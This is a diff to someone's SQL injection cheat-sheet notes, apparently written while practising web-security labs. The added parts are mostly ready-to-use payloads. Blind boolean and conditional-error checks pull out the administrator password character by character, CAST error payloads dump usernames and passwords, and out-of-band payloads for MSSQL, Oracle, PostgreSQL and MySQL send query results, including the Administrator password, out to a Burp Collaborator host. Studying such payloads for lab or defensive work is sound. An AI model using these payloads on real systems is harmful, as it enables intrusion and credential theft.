@@ -129,7 +129,21 @@ We can use it to brute password symbol by symbol like this:
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm        #returns True, meaning that 1 symbol of pass is greater then m
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't        #returns False, meaning that 1 symbol of pass is less then t
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's        #returns True, meaning that 1 symbol of pass is s
+xyz' AND (SELECT password FROM users WHERE username='administrator') > '0'--
 ```
+Checks before payload:
+```
+' AND '1'='1
+' AND '1'='2
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+' AND (SELECT username FROM users WHERE 'username')='administrator'--
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+```
+
+Note: Control+U in Burp will url encode payload
+
 Note: SUBSTRING() function could be named SUBSTR() on some DBs  
 To check next symbol use SUBSTRING((...), 2, 1)  
 it's good idea to use Burp Intruder or Python script
@@ -152,7 +166,19 @@ For different DBs:
 * Postgres: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
 * MySQL: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
 
-#### Visible error-base SQLo
+Checks before payload:
+```
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+#### Visible error-base SQLi
 Sometimes DB throws some additional info in error like `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`  
 To exploit this, we can use CAST:  
 `CAST((SELECT example_column FROM example_table) AS int)`
@@ -163,6 +189,14 @@ Example:
 This will throw an error:  
 `ERROR: invalid input syntax for type integer: "jec5qqzsfktcvtv2bewn"`  
 And from ehre we get our password
+
+```
+' AND CAST((SELECT 1) AS int)--
+' AND 1=CAST((SELECT 1) AS int)--
+' AND 1=CAST((SELECT username FROM users) AS int)--
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
 
 #### Time-Based SQLi
 For MSSQL:
@@ -200,5 +234,24 @@ It's possible to sue Burp collaborator for such exploits
 * MySQL: `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` .WOrks on Windows only
 * MySQL: (maybe it's part of previous payload, idk) `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`
 
-
-bkz3x3qa7tqcxi6d6wkksjd25tbkzbn0.oastify.com
+We can also exfiltrate data via OAST interaction:
+```
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+This will trigger request to <password><burp-collaborator-domain>
+* Oracle: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
+* Microsoft: `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"') `
+* PostgreSQL: 
+```
+create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f(); 
+```
+* MySQL: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` - For Windows only
